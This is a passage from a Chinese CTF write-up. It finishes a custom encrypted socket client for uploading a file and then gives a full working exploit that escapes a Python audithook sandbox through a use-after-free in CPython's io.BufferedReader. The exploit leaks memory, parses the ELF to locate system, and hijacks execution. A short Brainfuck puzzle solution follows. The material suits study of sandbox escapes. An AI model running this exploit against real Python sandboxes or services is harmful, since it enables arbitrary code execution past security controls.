            mes = self._recv(self.default_message_len)
            if i == message_listlen - 1:
                mes_padnum = int(self._recv(self.default_message_len).decode(
                    encoding=self.default_encoder))
            else:
                mes_padnum = 0
            mes = self.unpadding_packets(mes, mes_padnum)
            message += mes
        message = decompress(message)
        if is_decode:
            message = message.decode(encoding=self.default_encoder)
        return message
```

我们可以发现，这个函数与`recv`和`send`那一套不同，它进行了压缩和解压缩。同时每一个包的长度都是固定的。与`recv`和`send`相比，这个函数是将比较大的信息拆分成长度固定的块，再将每块用`_send`或`_recv`加密传输。注意到其使用`unpadding_packets`去掉后面填充的字符。这里为了简化，我帮你把`padding_packets`实现了，如下：

```
    def unpadding_packets(self, data: bytes, pad_num: int) -> bytes:
        '''
        Delete the blank bytes at the back of the message
        pad_num : number of the blank bytes
        pad_num = -1, delete all the blank bytes the the back(or use .rstrip() directly is ok)
        '''
        if pad_num == -1:
            data = data.rstrip()
        else:
            while pad_num > 0 and data[-1:] == b' ':
                data = data[:-1]
                pad_num -= 1
        return data
    def padding_packets(self, message: bytes, target_length: int = None) -> tuple:
        '''
        Pad the packet to {target_length} bytes with b' ', used in not-encrypted mode
        The packet must be smaller then {target_length}
        target_length = None : use self.default_message_len
        '''
        message = self.turn_to_bytes(message)
        if target_length == None:
            target_length = self.default_message_len
        if len(message) > target_length:
            raise MessageLengthError(
                'the length {} bytes of the message is bigger than {} bytes, please use self.send_large_small and self.recv instead'.format(str(len(message)), target_length))
        pad_num = target_length-len(message)
        message += b' ' * pad_num
        return (message, pad_num)
```

注：在加解密的时候也有填充函数`pad_packets_to_mutiple`和`unpad_packets_to_mutiple`，同样的，题目已经给出。

因此，我们实现`sendfile`和`send_large`逻辑。其主要内容就是读取一个文件，使用zlib压缩文件，将它拆成大小为`self.default_message_len`（题中为1024）的包，不够的用`padding_packets`填充。随后调用`_send`发送。最后一个包需要发送`b'EOF'`表示结束

实现如下：

```
    def sendfile(self, file_location: str) -> None:
        '''
        Send a file with the socket
        THE LOCATION MUST BE A FILE, NOT A DIR
        {self.default_message_len} bytes are read and sent in a single pass
        '''
        if path.exists(file_location) and not path.isdir(file_location):
            with open(file_location, 'rb') as file:
                self.send_large(file.read())
            self.send_large('EOF')  # Must to use send large, but this is bad
        else:
            raise FileExistsError(
                'the file {} does not exist or it is a dir'.format(file_location))

    def send_large(self, message) -> None:
        '''
        Send message with the socket
        can accept bytes, str, int, etc.
        every non-bytes message will be encoded with self.default_encoder
        Every packet is forced to be filled to {self.default_message_len} bytes
        '''
        message = self.turn_to_bytes(message)
        message = compress(message)
        message_list = [message[i:i + self.default_message_len]
                        for i in range(0, len(message), self.default_message_len)]
        message_list_len = len(message_list)
        self._send(self.padding_packets(
            self.turn_to_bytes(message_list_len))[0])
        message_index = 0
        for message in message_list:
            message_padded = self.padding_packets(message)
            message = message_padded[0]
            self._send(message)
            message_index += 1
            if message_index == message_list_len:
                pad_num = message_padded[1]
                self._send(self.padding_packets(
                    self.turn_to_bytes(str(pad_num)))[0])
```

编写tmp.py

![](/images/migrated/18730353/15.png)

利用上述脚本上传（总脚本在本题wp的末尾）

![](/images/migrated/18730353/16.png)

本地测试看到脚本被成功上传。并成功执行。至此，套接字编程部分结束，接下来开始解沙箱

### audithook沙箱——UAF

Python中的所有对象都是通过PyObject结构体表示的，每个对象类型（如列表、整数等）都扩展了PyObject结构体。

例如，PyListObject表示列表对象，包含引用计数、类型指针、元素数组等信息。

漏洞的核心在于io.BufferedReader的内部缓冲区管理。当BufferedReader读取数据时，会分配一个内部缓冲区，并通过memoryview对象引用该缓冲区。如果BufferedReader对象被释放，但其内部缓冲区的memoryview仍然被引用，就会导致Use-After-Free。

由此我们的利用链：

1.通过BufferedReader获取内部缓冲区的memoryview，并保存该引用。  
2.释放BufferedReader对象，导致内部缓冲区被释放，但memoryview仍然指向已释放的内存。  
3.创建一个与释放缓冲区大小相同的列表，使得列表的ob\_item指针与释放的缓冲区重合。  
4.通过memoryview修改释放的内存，伪造PyObject对象，进而控制程序执行流。

这个UAF不会调用到除了`builtins.id`之外的任何钩子。总体的利用思路：泄漏CPython的函数指针；计算CPython的基址；计算system或其PLT的地址；跳转到此地址，第一个参数指向/bin/rf即可。

可以看：[https://pwn.win/2022/05/11/python-buffered-reader.html](https://pwn.win/2022/05/11/python-buffered-reader.html)

最终的exp：

```
#!/usr/bin/python3
# Get reference to io module
io = open.__self__
PAGE_SIZE = 4096
SIZEOF_ELF64_SYM = 24
SIZEOF_PLT_STUB = 16
def p64(x):
    s = bytearray()
    while x > 0:
        s.append(x & 0xff)
        x >>= 8
    return s.ljust(8, b'\0')

def uN(b):
    out = 0
    for i in range(len(b)):
        out |= (b[i] & 0xff) << i*8
    return out

def u64(x):
    assert len(x) == 8
    return uN(x)

def u32(x):
    assert len(x) == 4
    return uN(x)

def u16(x):
    assert len(x) == 2
    return uN(x)

def flat(*args):
    return b''.join(args)

class File(io._RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

class Exploit:
    def _create_fake_byte_array(self, addr, size):
        byte_array_obj = flat(
            p64(10),            # refcount
            p64(id(bytearray)), # type obj
            p64(size),          # ob_size
            p64(size),          # ob_alloc
            p64(addr),          # ob_bytes
            p64(addr),          # ob_start
            p64(0x0),           # ob_exports
        )
        self.no_gc.append(byte_array_obj)  # stop gc from freeing after return
        self.freed_buffer[0] = id(byte_array_obj) + 32

    def leak(self, addr, length):
        self._create_fake_byte_array(addr, length)
        return self.fake_objs[0][0:length]

    def set_rip(self, addr, obj_refcount=0x10):
        """Set rip by using a fake object and associated type object."""
        # Fake type object
        type_obj = flat(
            p64(0xac1dc0de),    # refcount
            b'X'*0x68,          # padding
            p64(addr)*100,      # vtable funcs 
        )
        self.no_gc.append(type_obj)

        # Fake PyObject
        data = flat(
            p64(obj_refcount),  # refcount
            p64(id(type_obj)),  # pointer to fake type object
        )
        self.no_gc.append(data)

        # The bytes data starts at offset 32 in the object 
        self.freed_buffer[0] = id(data) + 32

        try:
            # Now we trigger it. This calls tp_getattro on our fake type object
            self.fake_objs[0].trigger
        except:
            # Avoid messy error output when we exit our shell
            pass

    def find_bin_base(self):
        # Leak tp_dealloc pointer of PyLong_Type which points into the Python
        # binary.
        leak = self.leak(id(int), 32)
        cpython_binary_ptr = u64(leak[24:32])
        addr = (cpython_binary_ptr >> 12) << 12  # page align the address
        # Work backwards in pages until we find the start of the binary
        for i in range(10000):
            nxt = self.leak(addr, 4)
            if nxt == b'\x7fELF':
                return addr
            addr -= PAGE_SIZE
        return None

    def find_system(self):
        """
        Return either the address of the system PLT stub, or the address of 
        system itself if the binary is full RELRO.
        """
        bin_base = self.find_bin_base()
        data = self.leak(bin_base, 0x1000)

        # Parse ELF header
        type = u16(data[0x10:0x12])
        is_pie = type == 3
        phoff = u64(data[0x20:0x28])
        phentsize = u16(data[0x36:0x38])
        phnum = u16(data[0x38:0x3a])

        # Find .dynamic section
        dynamic = None
        for i in range(phnum):
            hdr_off = phoff + phentsize*i
            hdr = data[hdr_off:hdr_off + phentsize]
            p_type = u32(hdr[0x0:0x4])
            p_vaddr = u64(hdr[0x10:0x18])
            if p_type == 2:  # PT_DYNAMIC
                dynamic = p_vaddr
        
        if dynamic is None:
            print("[!!] Couldn't find PT_DYNAMIC section")
            return None
        
        if is_pie:
            dynamic += bin_base

        print('[*] .dynamic:   {}'.format(hex(dynamic)))
        dynamic_data = e.leak(dynamic, 500)

        # Parse the Elf64_Dyn entries, extracting what we need
        i = 0
        got = None
        symtab = None
        strtab = None
        rela = None
        init = None
        while True:
            d_tag = u64(dynamic_data[i*16:i*16 + 8])
            d_un = u64(dynamic_data[i*16 + 8:i*16 + 16])
            if d_tag == 0 and d_un == 0:
                break
            elif d_tag == 3:    # DT_PLTGOT
                got = d_un
            elif d_tag == 5:    # DT_STRTAB
                strtab = d_un
            elif d_tag == 6:    # DT_SYMTAB
                symtab = d_un
            elif d_tag == 12:   # DT_INIT
                init = d_un
            elif d_tag == 23:   # DT_JMPREL
                rela = d_un
            i += 1

        if got is None or strtab is None or symtab is None or rela is None or \
            init is None:
            print("[!!] Missing required info in .dynamic")
            return None
        
        if is_pie:
            init += bin_base

        print('[*] DT_SYMTAB:  {}'.format(hex(symtab)))
        print('[*] DT_STRTAB:  {}'.format(hex(strtab)))
        print('[*] DT_RELA:    {}'.format(hex(rela)))
        print('[*] DT_PLTGOT:  {}'.format(hex(got)))
        print('[*] DT_INIT:    {}'.format(hex(init)))

        # Walk the relocation table, for each entry we read the relevant symtab
        # entry and then strtab entry to get the function name.
        rela_data = e.leak(rela, 0x1000)
        i = 0
        while True:
            off = i * 24
            r_info = u64(rela_data[off + 8:off + 16])
            symtab_idx = r_info >> 32  # ELF64_R_SYM
            symtab_entry = e.leak(symtab + symtab_idx * 24, SIZEOF_ELF64_SYM)
            strtab_off = u32(symtab_entry[0:4])
            name = e.leak(strtab + strtab_off, 6)
            if name == b'system':
                print('[*] Found system at rela index {}'.format(i))
                system_idx = i
                break
            i += 1
        
        # Leak start of GOT data to determine if we're full RELRO
        got_data = self.leak(got, 32)
        link_map = u64(got_data[8:16])
        dl_runtime_resolve = u64(got_data[16:24])

        if link_map == 0 and dl_runtime_resolve == 0:
            # The binary is likely full RELRO, which means system will already
            # be resolved in the GOT.
            print('[*] Full RELRO binary, reading system address from GOT')
            system_got = 24 + got + system_idx*8
            func = u64(self.leak(system_got, 8))
            print('[*] system:     {}'.format(hex(func)))
            return func

        # Find the PLT. We know it is always placed after the init function, so 
        # scan forwards looking for the first opcode of PLT.
        init_data = self.leak(init, 64)
        plt_offset = None
        for i in range(0, len(init_data), 2):
            if init_data[i:i+2] == b'\xff\x35':  # push [rip+offset]
                plt_offset = i
                break

        if plt_offset is None:
            print('[!!] Start of PLT not found')
            return None

        plt = init + plt_offset + 16  # skip first PLT entry which is resolver

        # PLT stubs are in the same order as rela entries, so we can use the
        # known system index to calculate the address of the system PLT stub.
        system_plt = plt + system_idx*SIZEOF_PLT_STUB
        print('[*] system plt: {}'.format(hex(system_plt)))
        return system_plt

    def __init__(self):
        # Trigger bug
        global view
        f = io.BufferedReader(File())
        f.read(1)
        del f
        view = view.cast('P')

        self.fake_objs = [None] * len(view)
        self.freed_buffer = view
        self.no_gc = []

e = Exploit()
system = e.find_system()
# When we get rip control rdi contains a pointer to our fake object, who's first 
# 8 bytes are its refcount. We can repurpose the refcount as our command to 
# system. Note the refcount is incremented by 1 before the call, which is why we
# decrement the first character.
e.set_rip(system, obj_refcount=u64(b'\x2ebin/rf\x00'))
```

经过audithook的测试，这段exp只会触发`builtins.id`的钩子。

### EXPLOIT!!!

我们创建tmp.py，内容即为上文中python uaf的exp，作为sendfile的对象。利用编写的客户端将其上传至远程服务器，运行`/bin/rf`最终获取flag

总体的exp.py

```
# -*- coding:utf-8 -*-
# @FileName  :main.py
# @Time      :2023/11/11 12:14:11
# @Author    :LamentXU
from socket import *

from pathlib import Path
from os import path, listdir
from time import sleep
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from random import uniform
from zlib import compress, decompress
from json import dumps, loads

'''
Definate all the errors
'''
class MessageLengthError(Exception):
    def __init__(self, message) -> None:
        self.message = message

class PasswordError(Exception):
    def __init__(self, message) -> None:
        self.message = message
class SimpleTCP():
    '''
    The main class when using TCP
    '''

    def __init__(self, family: AddressFamily = AF_INET, type: SocketKind = SOCK_STREAM
                 , proto: int = -1, fileno: int = None, is_encrypted: bool = True, AES_key: bytes = None, password: bytes = None) -> None:
        '''
        is_encrypted: use encrypted connection, only for server
        AES_key: use a fixed AES_key, None for random, must be 16 bytes, only for server
        password: A fixed password is acquired from the client (must smaller than be 100 bytes), if wrong, the connection will be closed
            if password is set in server, every time a client connect, the client must send the same password back to the server to accept.
            if password is set in client, every time you connect to the server, the password will be sent to the server to verify.
            if password is None, no password will be used.
        self.Default_message_len: if in encrypted mode, the value must be a multiple of self.BLOCK_SIZE
        MAKE SURE THE DEFAULT_MESSAGE_LEN OF BOTH SERVER AND CLIENT ARE SAME, Or it could be a hassle
        '''
        
        self.BLOCK_SIZE = 16 # block size of padding text which will be encrypted by AES
        # the block size must be a mutiple of 8
        self.default_encoder = 'utf8'  # the default encoder used in send and recv when the message is not bytes
        if is_encrypted:
            if AES_key == None:
                self.key = get_random_bytes(16)  # generate 16 bytes AES code
            else:
                self.key = AES_key #TODO check the input 
            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)
        else:
            self.key, self.cipher_aes = None, None
        self.default_message_len = 1024 # length of some basic message, it's best not to go below 1024 bytes
        if password == None:
            self.password = None
        else:
            self.password = self.turn_to_bytes(password)
            if len(password) > 100:
                raise ValueError('The password is too long, it must be smaller than 100 bytes')
        self.s = socket(family, type, proto, fileno)  # main socket
    def accept(self) -> tuple:
        '''
        Accept with information exchange and key exchange, return the address of the client
        if the password from client is wrong or not set, raise PasswordError
        '''
        self.s, address = self.s.accept()
        if self.key == None:
            is_encrypted = False
        else:
            is_encrypted = True
        if self.password == None:
            has_password = False
        else:
            has_password = True
        info_dict = {
            'is_encrypted' : is_encrypted,
            'has_password' : has_password}
        info_dict = dumps(info_dict).encode(encoding=self.default_encoder)
        self.s.send(self.turn_to_bytes(len(info_dict)))
        self.s.send(info_dict)
        if has_password:
            password_length = self.unpadding_packets(self.s.recv(3), -1)
            if not password_length:
                self.s.close()
                raise PasswordError(f'The client {address} does not send the password, the connection will be closed')
            recv_password = self.s.recv(int(password_length.decode(encoding=self.default_encoder))) # the first byte is whether the password is aquired(1) or not(0), the rest is the password, the password is padded to 100 bytes
            if recv_password != self.password or recv_password[0] == b'0':
                self.s.send(b'0')
                self.s.close()
                raise PasswordError(f'The password {recv_password} is wrong, the connection from {address} will be closed, you can restart the accept() function or put it in a while loop to keep accepting')
            else:
                self.s.send(b'1')
        if is_encrypted:
            public_key = self.s.recv(450)
            rsa_public_key = RSA.import_key(public_key)
            cipher_rsa = PKCS1_OAEP.new(rsa_public_key)
            encrypted_aes_key = cipher_rsa.encrypt(self.key)
            self.s.send(encrypted_aes_key)
        # TODO
        return address
    def connect(self, Address: tuple) -> None:
        '''
        Connect with information exchange and key exchange
        if the password from client is wrong or not set, raise PasswordError
        '''
        self.s.connect(Address)
        info_dict_len = int(self.s.recv(2).decode(encoding=self.default_encoder))
        info_dict = self.s.recv(info_dict_len).decode(encoding=self.default_encoder)
        info = loads(info_dict)
        if info['has_password'] == True:
            if self.password == None:
                self.s.send(b'   ') # send three space to tell the server that the password is not set
                self.s.close()
                raise PasswordError('The server requires a password, please set it in the client or server')
            self.s.send(str(len(self.password)).encode(encoding=self.default_encoder))
            self.s.send(self.password)
            password_confirm = self.s.recv(1)
            if password_confirm != b'1':
                self.s.close()
                raise PasswordError('The password is wrong, the connection will be closed')
        if info['is_encrypted'] == True:
            tmp_key = RSA.generate(2048)
            private_key = tmp_key.export_key()
            public_key = tmp_key.publickey().export_key()
            self.s.send(public_key)
            rsa_private_key = RSA.import_key(private_key)
            cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
            encrypted_aes = self.s.recv(256).rstrip(b"\x00")
            self.key = cipher_rsa.decrypt(encrypted_aes)
            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)
        else:
            self.key, self.cipher_aes = None, None
    def turn_to_bytes(self, message) -> bytes:
        '''
        Turn str, int, etc. to bytes using {self.default_encoder}
        '''
        type_of_message = type(message)
        if type_of_message == str:
            try:
                message = message.encode(encoding=self.default_encoder)
            except Exception as e:
                raise TypeError(
                    'Unexpected type "{}" of {} when encode it with {}, raw traceback: {}'.format(type_of_message, message, self.default_encoder, e))
        elif type_of_message == bytes:
            pass
        else:
            try:
                message = str(message).encode(encoding=self.default_encoder)
            except:
                raise TypeError(
                    'Unexpected type "{}" of {}'.format(type_of_message, message))
        return message

    def padding_packets(self, message: bytes, target_length: int = None) -> tuple:
        '''
        Pad the packet to {target_length} bytes with b' ', used in not-encrypted mode
        The packet must be smaller then {target_length}
        target_length = None : use self.default_message_len
        '''
        message = self.turn_to_bytes(message)
        if target_length == None:
            target_length = self.default_message_len
        if len(message) > target_length:
            raise MessageLengthError(
                'the length {} bytes of the message is bigger than {} bytes, please use self.send_large_small and self.recv instead'.format(str(len(message)), target_length))
        pad_num = target_length-len(message)
        message += b' ' * pad_num
        return (message, pad_num)
    def pad_packets_to_mutiple(self, data: bytes, block_size: int == None) -> bytes:
        '''
        Pad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode
        target_length = None : use self.BLOCK_SIZE
        '''
        padding_length = block_size - (len(data) % block_size)
        if padding_length == 0:
            padding_length = block_size
        padding = bytes([padding_length]) * padding_length
        padded_data = data + padding
        return padded_data
    def unpad_packets_to_mutiple(self, padded_data: bytes, block_size: int == None) -> bytes:
        '''
        Unpad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode
        target_length = None : use self.BLOCK_SIZE
        '''
        if block_size == None:
            block_size = self.BLOCK_SIZE
        padding = padded_data[-1]
        if padding > block_size or any(byte != padding for byte in padded_data[-padding:]):
            raise ValueError("Invalid padding")
        return padded_data[:-padding]
    def send_large(self, message) -> None:
        '''
        Send message with the socket
        can accept bytes, str, int, etc.
        every non-bytes message will be encoded with self.default_encoder
        Every packet is forced to be filled to {self.default_message_len} bytes
        '''
        message = self.turn_to_bytes(message)
        message = compress(message)
        message_list = [message[i:i + self.default_message_len]
                        for i in range(0, len(message), self.default_message_len)]
        message_list_len = len(message_list)
        self._send(self.padding_packets(
            self.turn_to_bytes(message_list_len))[0])
        message_index = 0
        for message in message_list:
            message_padded = self.padding_packets(message)
            message = message_padded[0]
            self._send(message)
            message_index += 1
            if message_index == message_list_len:
                pad_num = message_padded[1]
                self._send(self.padding_packets(
                    self.turn_to_bytes(str(pad_num)))[0])

    def send(self, message) -> None:
        '''
        Send a message with the socket
        can accept bytes, str, int, etc.
        The data should not be larger than 9999 bytes
        It can be used at any time 
        Use self.send_large and recv_large if you want to send a big message
        '''
        message = self.turn_to_bytes(message)
        try:
            message_len = self.padding_packets(
                self.turn_to_bytes(len(message)), target_length=4)[0]
        except MessageLengthError:
            raise MessageLengthError(
                'The length of message is longer than 9999 bytes({} bytes), please use send_large instead'.format(str(len(message))))
        self._send(message_len)
        self._send(message)

    def sendfile(self, file_location: str) -> None:
        '''
        Send a file with the socket
        THE LOCATION MUST BE A FILE, NOT A DIR
        {self.default_message_len} bytes are read and sent in a single pass
        '''
        if path.exists(file_location) and not path.isdir(file_location):
            with open(file_location, 'rb') as file:
                self.send_large(file.read())
            self.send_large('EOF')  # Must to use send large, but this is bad
        else:
            raise FileExistsError(
                'the file {} does not exist or it is a dir'.format(file_location))

    def unpadding_packets(self, data: bytes, pad_num: int) -> bytes:
        '''
        Delete the blank bytes at the back of the message
        pad_num : number of the blank bytes
        pad_num = -1, delete all the blank bytes the the back(or use .rstrip() directly is ok)
        '''
        if pad_num == -1:
            data = data.rstrip()
        else:
            while pad_num > 0 and data[-1:] == b' ':
                data = data[:-1]
                pad_num -= 1
        return data

    def send_dir(self, src_path: str) -> None:
        target_path = path.basename(src_path)

        def send_file_in_dir(src_path: str, target_path: str):
            if not path.exists(src_path):
                raise FileExistsError('Path {} does not exists'.format(src_path))
            filelist_src = listdir(src_path)  # Used to return a file name and directory name
            for file in filelist_src:  # Go through all the files or folders
                src_path_read_new = path.join(
                    path.abspath(src_path), file)
                target_path_write_new = path.join(target_path, file)
                if path.isdir(src_path_read_new):  # Determine whether the read path is a directory folder, and perform recursion if it is a folder
                    send_file_in_dir(src_path_read_new,
                                     target_path_write_new)  # recursion
                else:  # If it is a file, send it
                    self.send('FILE')
                    self.send(target_path_write_new)
                    self.sendfile(src_path_read_new)
        send_file_in_dir(src_path, target_path)
        self.send('END')

    def _send(self, message: bytes) -> None:
        '''
        The basic method to encrypted and send data 
        MUST BE A MUTIPLE OF THE BLOCK SIZE IN ENCRYPTED MODE
        '''
        if self.cipher_aes != None:
            output_message = self.cipher_aes.encrypt(self.pad_packets_to_mutiple(message, self.BLOCK_SIZE))
            # plainmessage = unpad(self.cipher_aes.decrypt(output_message), self.BLOCK_SIZE)
        else:
            output_message = message
        self.s.send(output_message)  # The TCP mode

    def _recv(self, length: int) -> bytes:
        '''
        The basic method to decrypted and recv data
        '''
        if self.cipher_aes != None:
            if length % 16 == 0:
                length += 16
            length = (length + self.BLOCK_SIZE-1) // self.BLOCK_SIZE * self.BLOCK_SIZE # round up to multiple of 16
            message = self.s.recv(length)
            message = self.cipher_aes.decrypt(message)
            message = self.unpad_packets_to_mutiple(message, self.BLOCK_SIZE)
        else:
            message = self.s.recv(length)
        return message # The TCP mode
    def recv_dir(self, target_path: str, is_overwrite: bool = False) -> None:
        '''
        The method to recv dir from self.send_dir
        target_path : the path to save the dir
        is_overwrite : Overwrite a file when a file with the same name appears, otherwise raise an error
        '''
        while True:
            typeofmessage = self.recv(is_decode=True)
            if typeofmessage == 'FILE':
                recv_target_path = path.join(target_path, self.recv())
                self.savefile(path.dirname(recv_target_path), path.basename(
                    recv_target_path), is_overwrite=is_overwrite)
            elif typeofmessage == 'END':
                return True
            else:
                raise RuntimeError(
                    'Unknown header type of dir_send {}, do you use the wrong method to send a dir? please use self.send_dir instead'.format(typeofmessage))

    def recv_large(self, is_decode: bool = True):
        '''
        The return type can be bytes or string
        The method to recv message WHICH IS SENT BY self.send_large
        is_decode : decode the message with {self.default_encoder}
        '''
        message_listlen = self._recv(self.default_message_len).decode(
            encoding=self.default_encoder).rstrip()
        message_listlen = int(message_listlen)
        message = b''
        for i in range(0, message_listlen):
            mes = self._recv(self.default_message_len)
            if i == message_listlen - 1:
                mes_padnum = int(self._recv(self.default_message_len).decode(
                    encoding=self.default_encoder))
            else:
                mes_padnum = 0
            mes = self.unpadding_packets(mes, mes_padnum)
            message += mes
        message = decompress(message)
        if is_decode:
            message = message.decode(encoding=self.default_encoder)
        return message

    def recv(self, is_decode: bool = True):
        '''
        The return type can be bytes or string
        The method to recv message WHICH IS SENT BY self.send
        is_decode : decode the message with {self.default_encoder}
        '''
        message_len = self._recv(4).rstrip()
        message_len = int(message_len.decode(encoding=self.default_encoder))
        message = self._recv(message_len)
        if is_decode:
            message = message.decode(encoding=self.default_encoder)
        return message

    def savefile(self, savepath: str, filename: str = 'File_from_python_socket', is_overwrite: bool = False) -> None:
        '''
        Receive and save file sent using self.send_largefile directly
        savepath : path to save, MUST BE A DIR
        filename : name of the file
        is_overwrite : Overwrite a file when a file with the same name appears, otherwise raise an error
        '''
        if filename != None:
            file_location = path.join(savepath, filename)
        else:
            file_location = savepath
            filename = path.basename(savepath)
            savepath = path.dirname(savepath)
        if path.exists(file_location) and not is_overwrite:
            raise FileExistsError(
                'Already has a file named {} in {}'.format(file_location, savepath))
        Path(savepath).mkdir(parents=True, exist_ok=True)
        with open(file_location, 'wb') as file:
            while True:
                a = self.recv_large(is_decode=False)
                if a != 'EOF'.encode(encoding=self.default_encoder):
                    file.write(a)
                    file.flush()
                else:
                    break

    def recvfile(self) -> bytes:
        '''
        Only receive file sent using self.send_largefile
        '''
        output = b''
        while True:
            a = self.recv_large(is_decode=False)
            if a != 'EOF'.encode(encoding=self.default_encoder):
                output += a
            else:
                break
        return output
s = SimpleTCP(password='LetsLament')
s.connect(('127.0.0.1', 13337))
print(s.recv())
print(s.recv())
print(s.recv())
print(s.recv())
s.sendfile('tmp.py')
while True:
    try:
        print(s.recv())
    except:
        break
s.close()
```

写好tmp.py放在同目录。运行脚本。

![](/images/migrated/18730353/17.png)

`flag{__Tomorrow_I_will_be_heading_my_way__}`

感觉难度作为misc压轴来说算常规吧（bushi）

# MISC-签个到吧

## 出题灵感

一个简单的bf逆向，由于过于简单我给他出在misc了。

## 题解

```
>+++++++++++++++++[<++++++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++[<+++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++[<++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++++++[<+++++++>-+-+-+-]<[-]>++++++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++[<++++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>+++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++[<+++++>-+-+-+-]<[-]
```

不是传统的brainfuck编码。要去可视化编译器看。基本直接可以从编译器看到flag。非常简单的题目。

[https://ashupk.github.io/Brainfuck/brainfuck-visualizer-master/index.html#PisrKysrKysrKysrKysrKysrWzwrKysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKysrK1s8KysrKysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrWzwrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrWzwrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrK1s8KysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKytbPCsrKysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8Kz4tKy0rLSstXTxbLV0+KysrKysrKytbPCsrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8Kz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrKysrKysrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrKysrKysrKysrKysrKysrKysrK1s8KysrKz4tKy0rLSstXTxbLV0+KysrKysrKytbPCsrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKysrWzwrKysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrKysrKysrK1s8KysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrK1s8KysrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrK1s8KysrKys+LSstKy0rLV08Wy1dPisrKysrKysrKytbPCsrKysrPi0rLSstKy1dPFstXT4rKysrKysrK1s8KysrKysrPi0rLSstKy1dPFstXT4rKysrKysrKysrWzwrKysrKz4tKy0rLSstXTxbLV0+KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKytbPCs+LSstKy0rLV08Wy1dPisrKysrK